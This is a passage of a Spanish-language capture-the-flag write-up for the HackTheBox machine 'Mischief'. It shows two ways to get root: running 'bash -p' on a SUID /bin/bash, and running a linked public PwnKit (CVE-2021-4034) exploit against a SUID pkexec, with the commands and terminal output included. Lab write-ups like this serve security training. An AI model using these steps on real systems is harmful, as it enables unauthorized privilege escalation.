+<p class="plain-text">Despues de ejecutar el comando como <code class="language-plaintext highlighter-rouge">root</code> los privilegios en la bash cambian a <code class="language-plaintext highlighter-rouge">suid</code>, por lo que al ejecutar <code class="language-plaintext highlighter-rouge">bash -p</code> nos convertimos en root facilmente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Apr  4  2018 </span><span class="err">/bin/bash</span><span class="p">  
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ bash -p
+bash-4.4# whoami
+root
+bash-4.4# hostname -I
+10.10.10.92 dead:beef::250:56ff:fe96:ee9e 
+bash-4.4#</span>
+</code></pre></div></div><br> 
+
+</section>
+<section class="post" id="extra3-root">
+<br><h3 class="post-title">Extra 3 - root</h3><br>
+
+<p class="plain-text">Al buscar binarios con privilegio <code class="language-plaintext highlighter-rouge">suid</code> nos encontramos con el ya conocido <code class="language-plaintext highlighter-rouge">pkexec</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/gpasswd
+/bin/umount
+/bin/ntfs-3g
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ping
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/bin/pkexec
+-rwsr-xr-x 1 root root 22520 Mar 27  2018 </span><span class="err">/usr/bin/pkexec</span><span class="p">  
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar un <a href="https://github.com/joeammond/CVE-2021-4034">exploit</a> para explotar el famoso <code class="language-plaintext highlighter-rouge">pwnkit</code> y nos convertimos en root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 CVE-2021-4034.py
+[+] Creating shared library for exploit code.  
+[+] Calling execve()
+# whoami
+root
+# hostname -I
+10.10.10.92 dead:beef::250:56ff:fe96:ee9e
+#</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
